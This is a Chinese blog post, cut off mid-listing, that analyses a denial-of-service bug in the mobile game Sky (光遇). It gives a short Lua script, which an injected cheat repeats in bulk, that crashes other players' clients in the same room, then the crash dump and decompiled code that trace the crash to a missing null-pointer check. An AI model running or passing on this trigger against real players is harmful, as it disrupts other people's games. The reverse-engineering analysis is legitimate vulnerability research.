sm:mb-2 sm:mt-6 sm:text-3xl astro-qr7qsrsa"> 光遇客户端 RPC 洪泛拒绝服务漏洞分析 </h1> <div class="mt-3 italic astro-qr7qsrsa"> <blockquote class="text-sm text-muted-foreground astro-qr7qsrsa"><q class="astro-qr7qsrsa">光遇客户端拒绝服务漏洞分析</q></blockquote> <!-- <div class={cn('text-base text-sm text-muted-foreground', className)} {...props}>
+  <span class='waline-pageview-count' data-path={path}></span> views
+  {
+    comment && (
+      <>
+        {' | '}
+        <a href='#waline'>
+          <span class='waline-comment-count' data-path={path} /> comments
+        </a>
+      </>
+    )
+  }
+</div> --> </div> </div>  <div class="mt-4 w-1/2 border-t max-md:mx-auto sm:mt-6 sm:w-1/3 astro-qr7qsrsa"></div> <script type="module">const o=window.innerHeight,s=o/9,i=o*2/9,l=o*3/9,e=document.getElementById("blurImage");e&&window.addEventListener("scroll",()=>{const t=window.scrollY;t>=l?e.style.opacity="0.15":t>=i?e.style.opacity="0.3":t>=s&&(e.style.opacity="0.45")});</script> </div>  <div id="content" class="max-w-none animate mt-8 md:min-w-[45ch] overflow-x-hidden prose text-base astro-scuu7fyy">   <h2 id="漏洞信息">漏洞信息<a class="anchor" href="#漏洞信息">#</a></h2>
+<p>该漏洞属于 <code>Resource-Exhaustion DoS via Unbounded RPC Flood</code></p>
+<h3 id="影响版本">影响版本<a class="anchor" href="#影响版本">#</a></h3>
+<p>游戏版本: 0.16.7.421589</p>
+<h2 id="起因">起因<a class="anchor" href="#起因">#</a></h2>
+<p>在B站看到一个外挂的视频，介绍了一种方法可以使同房间内的玩家游戏崩溃，经初步观察得出如下触发条件</p>
+<ol>
+<li>游戏开启加速</li>
+<li>短时间内大量执行如下lua脚本(游戏自带一个lua引擎)，<code>stuffType->8</code> 对应游戏内的光翼，一组执行100次</li>
+</ol>
+<div class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="lua"><pre><code><span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">local</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> e </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> game</span><span style="color:#24292E;--shiki-dark:#E1E4E8">:</span><span style="color:#005CC5;--shiki-dark:#79B8FF">eventBarn</span><span style="color:#24292E;--shiki-dark:#E1E4E8">():</span><span style="color:#005CC5;--shiki-dark:#79B8FF">AddEventByMetaName</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(</span><span style="color:#032F62;--shiki-dark:#9ECBFF">"PlayPurchaseFX"</span><span style="color:#24292E;--shiki-dark:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">e</span><span style="color:#24292E;--shiki-dark:#E1E4E8">:</span><span style="color:#005CC5;--shiki-dark:#79B8FF">stuffType</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(</span><span style="color:#005CC5;--shiki-dark:#79B8FF">8</span><span style="color:#24292E;--shiki-dark:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">e</span><span style="color:#24292E;--shiki-dark:#E1E4E8">:</span><span style="color:#005CC5;--shiki-dark:#79B8FF">invisibleItem</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(</span><span style="color:#005CC5;--shiki-dark:#79B8FF">false</span><span style="color:#24292E;--shiki-dark:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">e</span><span style="color:#24292E;--shiki-dark:#E1E4E8">:</span><span style="color:#005CC5;--shiki-dark:#79B8FF">autoStart</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(</span><span style="color:#005CC5;--shiki-dark:#79B8FF">true</span><span style="color:#24292E;--shiki-dark:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">e</span><span style="color:#24292E;--shiki-dark:#E1E4E8">:</span><span style="color:#005CC5;--shiki-dark:#79B8FF">Start</span><span style="color:#24292E;--shiki-dark:#E1E4E8">()</span></span></code></pre><span class="language ps-1 pe-3 text-sm bg-muted text-muted-foreground">lua</span><button class="copy text-muted-foreground p-1 box-content border rounded-lg bg-card" aria-label="Copy code" data-code="local e = game:eventBarn():AddEventByMetaName(&#x22;PlayPurchaseFX&#x22;)
+e:stuffType(8)
+e:invisibleItem(false)
+e:autoStart(true)
+e:Start()" onclick="
+          navigator.clipboard.writeText(this.dataset.code);
+          this.classList.add(&#x27;copied&#x27;);
+          setTimeout(() => this.classList.remove(&#x27;copied&#x27;), 2000)
+        "><div class="ready"><svg class="size-5"><use href="/icons/code.svg#mingcute-clipboard-line"></use></svg></div><div class="success hidden"><svg class="size-5"><use href="/icons/code.svg#mingcute-file-check-line"></use></svg></div></button></div>
+<h2 id="崩溃点分析">崩溃点分析<a class="anchor" href="#崩溃点分析">#</a></h2>
+<p>经过长达半小时的分析和手搓之后，复现得到了同样的崩溃结果，顺带测试了一下 <code>stuffType</code> 设为0-9，只有 8 会导致崩溃</p>
+<p>logcat日志里还会出现大量的 <code>[W] Invalid PurchaseFxItem3D configuration</code></p>
+<p>既然有崩溃那么自然会产生崩溃文件转储，保存在<code>/data/user/0/com.netease.sky/files/uniTrace/crashhunter/</code>目录下，可以提取出来分析</p>
+<p>杂活交给大肥鱼去干，过了 1 分钟就得到了崩溃点</p>
+<div class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><pre><code><span class="line"><span>pid 23657 / tid 23959 ("MainThread")</span></span>
+<span class="line"><span>SIGSEGV  si_code=1  SEGV_MAPERR  fault addr = 0x10</span></span>
+<span class="line"><span>pc = 0x7dd2a3c69c  → 模块内偏移 0x302869c (libBootloader.so)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>0x302869c:  ldrb w8, [x19, #0x10]      ; x19 = 0</span></span></code></pre><span class="language ps-1 pe-3 text-sm bg-muted text-muted-foreground">plaintext</span><button class="copy text-muted-foreground p-1 box-content border rounded-lg bg-card" aria-label="Copy code" data-code="pid 23657 / tid 23959 (&#x22;MainThread&#x22;)
+SIGSEGV  si_code=1  SEGV_MAPERR  fault addr = 0x10
+pc = 0x7dd2a3c69c  → 模块内偏移 0x302869c (libBootloader.so)
+
+0x302869c:  ldrb w8, [x19, #0x10]      ; x19 = 0" onclick="
+          navigator.clipboard.writeText(this.dataset.code);
+          this.classList.add(&#x27;copied&#x27;);
+          setTimeout(() => this.classList.remove(&#x27;copied&#x27;), 2000)
+        "><div class="ready"><svg class="size-5"><use href="/icons/code.svg#mingcute-clipboard-line"></use></svg></div><div class="success hidden"><svg class="size-5"><use href="/icons/code.svg#mingcute-file-check-line"></use></svg></div></button></div>
+<p>IDA分析一下，对应函数是 <code>WingBuffVisual::Initialize</code>，在调用 <code>fx->flags</code> 的时候用于空指针导致了异常，前面也没有对空指针进行校验</p>
+<div class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><pre><code><span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">void</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> __fastcall WingBuffVisual::</span><span style="color:#6F42C1;--shiki-dark:#B392F0">Initialize</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(WingBuffVisual </span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#E36209;--shiki-dark:#FFAB70">fx</span><span style="color:#24292E;--shiki-dark:#E1E4E8">, Game </span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#E36209;--shiki-dark:#FFAB70">game</span><span style="color:#24292E;--shiki-dark:#E1E4E8">, </span><span style="color:#D73A49;--shiki-dark:#F97583">const</span><span style="color:#D73A49;--shiki-dark:#F97583"> float</span><span style="color:#D73A49;--shiki-dark:#F97583"> *</span><span style="color:#E36209;--shiki-dark:#FFAB70">position</span><span style="color:#24292E;--shiki-dark:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">{</span></span>
+<span class="line"><span style="color:#6A737D;--shiki-dark:#6A737D">  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">  if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( (</span><span style="color:#6F42C1;--shiki-dark:#B392F0">WORD5</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(xmmword_4D265D4) </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#D73A49;--shiki-dark:#F97583"> 0x</span><span style="color:#005CC5;--shiki-dark:#79B8FF">A080</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) </span><span style="color:#D73A49;--shiki-dark:#F97583">!=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">    ||</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> (v18 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> game, handled </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> xxx_dispatch</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(argument0: fx).handled, game </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> v18, handled </span><span style="color:#D73A49;--shiki-dark:#F97583">==</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) )</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  {</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">    if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( (fx->flags </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) </span><span style="color:#D73A49;--shiki-dark:#F97583">==</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> )</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    {</span></span>
+<span class="line"><span style="color:#6A737D;--shiki-dark:#6A737D">      // ...</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  }</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">}</span></span></code></pre><span class="language ps-1 pe-3 text-sm bg-muted text-muted-foreground">c</span><button class="copy text-muted-foreground p-1 box-content border rounded-lg bg-card" aria-label="Copy code" data-code="void __fastcall WingBuffVisual::Initialize(WingBuffVisual *fx, Game *game, const float *position)
+{
+  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD &#x22;+&#x22; TO EXPAND]
+
+  if ( (WORD5(xmmword_4D265D4) &#x26; 0xA080) != 0
+    || (v18 = game, handled = xxx_dispatch(argument0: fx).handled, game = v18, handled == 0) )
+  {
+    if ( (fx->flags &#x26; 1) == 0 )
+    {
+      // ...
+    }
+  }
+}" onclick="
+          navigator.clipboard.writeText(this.dataset.code);
+          this.classList.add(&#x27;copied&#x27;);
+          setTimeout(() => this.classList.remove(&#x27;copied&#x27;), 2000)
+        "><div class="ready"><svg class="size-5"><use href="/icons/code.svg#mingcute-clipboard-line"></use></svg></div><div class="success hidden"><svg class="size-5"><use href="/icons/code.svg#mingcute-file-check-line"></use></svg></div></button></div>
+<p>找交叉引用回到上层<code>PurchaseFx::Initialize</code>，大致重要的代码如下，顺带解释了前面日志里大量的<code>Invalid PurchaseFxItem3D configuration</code>字符串来源，只要<code>stuffType</code>不为1那么就会有这条日志，看起来和崩溃没有直接关系</p>
+<p><code>stuffType</code> 0~7走的都是同一个模型改改颜色和大小，9是换了个模型，只有8是特殊的。注意到在调用<code>WingBuffVisual::Initialize</code>初始化前，会先调用一个工厂函数<code>WingBuffBarn::CreateWingBuffVisual</code></p>
+<div class="astro-code astro-code-themes github-light github-dark collapsed" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><pre><code><span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">unsigned</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> __int64 __fastcall PurchaseFx::</span><span style="color:#6F42C1;--shiki-dark:#B392F0">Initialize</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(PurchaseFx </span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#E36209;--shiki-dark:#FFAB70">fx</span><span style="color:#24292E;--shiki-dark:#E1E4E8">, Game </span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#E36209;--shiki-dark:#FFAB70">game</span><span style="color:#24292E;--shiki-dark:#E1E4E8">, </span><span style="color:#D73A49;--shiki-dark:#F97583">void</span><span style="color:#D73A49;--shiki-dark:#F97583"> *</span><span style="color:#E36209;--shiki-dark:#FFAB70">staticHeap</span><span style="color:#24292E;--shiki-dark:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">{</span></span>
+<span class="line"><span style="color:#6A737D;--shiki-dark:#6A737D">  // ...</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">  for</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( k </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">; k </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x3C;</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> fx->itemCount; </span><span style="color:#D73A49;--shiki-dark:#F97583">++</span><span style="color:#24292E;--shiki-dark:#E1E4E8">k )</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  {</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    item </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#D73A49;--shiki-dark:#F97583"> &#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">fx->items[k];</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">    if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( item->stuffType </span><span style="color:#D73A49;--shiki-dark:#F97583">!=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> )</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    {</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">      sub_2219518</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: </span><span style="color:#D73A49;--shiki-dark:#F97583">0x</span><span style="color:#005CC5;--shiki-dark:#79B8FF">4DA1CCD4</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">      LogStream_Construct</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(</span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">stream, category: </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">byte_5738FB, priority: </span><span style="color:#005CC5;--shiki-dark:#79B8FF">2</span><span style="color:#D73A49;--shiki-dark:#F97583">u</span><span style="color:#24292E;--shiki-dark:#E1E4E8">, file: </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">byte_5738FB, line: </span><span style="color:#D73A49;--shiki-dark:#F97583">0x</span><span style="color:#005CC5;--shiki-dark:#79B8FF">16D</span><span style="color:#D73A49;--shiki-dark:#F97583">u</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">      sub_22194DC</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">stream, s: </span><span style="color:#032F62;--shiki-dark:#9ECBFF">"Invalid PurchaseFxItem3D configuration"</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">      LogStream_Destroy</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(</span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">stream);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      item->value </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    createLensFlare </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    createWingBuffFx </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    modelType </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 6</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    stuffType </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> item->stuffType;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">    switch</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( stuffType )</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    {</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">      case</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">        switch</span><span style="color:#24292E;--shiki-dark:#E1E4E8">...</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">        break</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">      case</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 2</span><span style="color:#24292E;--shiki-dark:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        modelType </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 3</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">        LODWORD</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(v9) </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1036831949</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        v9 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> sub_1B29D74</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: </span><span style="color:#005CC5;--shiki-dark:#79B8FF">1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">, result: v9, a3: </span><span style="color:#005CC5;--shiki-dark:#79B8FF">0.1</span><span style="color:#D73A49;--shiki-dark:#F97583">f</span><span style="color:#24292E;--shiki-dark:#E1E4E8">, a4: </span><span style="color:#005CC5;--shiki-dark:#79B8FF">0.5</span><span style="color:#24292E;--shiki-dark:#E1E4E8">, a5: </span><span style="color:#005CC5;--shiki-dark:#79B8FF">1.0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        v64 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> v9;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        v12 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> item;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">        *</span><span style="color:#24292E;--shiki-dark:#E1E4E8">item->color </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#D73A49;--shiki-dark:#F97583"> *&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v9;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">        *&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v12->color[</span><span style="color:#005CC5;--shiki-dark:#79B8FF">2</span><span style="color:#24292E;--shiki-dark:#E1E4E8">] </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#D73A49;--shiki-dark:#F97583"> *</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(</span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v64 </span><span style="color:#D73A49;--shiki-dark:#F97583">+</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        item->scale </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0.6</span><span style="color:#D73A49;--shiki-dark:#F97583">f</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">        break</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">      case</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 3</span><span style="color:#24292E;--shiki-dark:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        modelType </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 3</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">        LODWORD</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(v9) </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0.75</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        v9 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> sub_1B29D74</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: </span><span style="color:#005CC5;--shiki-dark:#79B8FF">1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">, result: v9, a3: </span><span style="color:#005CC5;--shiki-dark:#79B8FF">0.0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">, a4: </span><span style="color:#005CC5;--shiki-dark:#79B8FF">0.0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">, a5: </span><span style="color:#005CC5;--shiki-dark:#79B8FF">1.0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        v62 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> v9;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        v14 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> item;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">        *</span><span style="color:#24292E;--shiki-dark:#E1E4E8">item->color </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#D73A49;--shiki-dark:#F97583"> *&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v9;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">        *&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v14->color[</span><span style="color:#005CC5;--shiki-dark:#79B8FF">2</span><span style="color:#24292E;--shiki-dark:#E1E4E8">] </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#D73A49;--shiki-dark:#F97583"> *</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(</span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v62 </span><span style="color:#D73A49;--shiki-dark:#F97583">+</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        item->scale </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0.6</span><span style="color:#D73A49;--shiki-dark:#F97583">f</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">        break</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">      case</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 4</span><span style="color:#24292E;--shiki-dark:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        modelType </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 3</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">        *</span><span style="color:#24292E;--shiki-dark:#E1E4E8">item->color </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> xmmword_4D28900;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        item->scale </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0.6</span><span style="color:#D73A49;--shiki-dark:#F97583">f</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">        break</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">      case</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 5</span><span style="color:#24292E;--shiki-dark:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        modelType </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 3</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">        LODWORD</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(v9) </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0.75</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        v9 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> sub_1B29D74</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: </span><span style="color:#005CC5;--shiki-dark:#79B8FF">1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">, result: v9, a3: </span><span style="color:#005CC5;--shiki-dark:#79B8FF">0.0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">, a4: </span><span style="color:#005CC5;--shiki-dark:#79B8FF">0.0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">, a5: </span><span style="color:#005CC5;--shiki-dark:#79B8FF">1.0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        v63 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> v9;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        v13 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> item;</span></span>
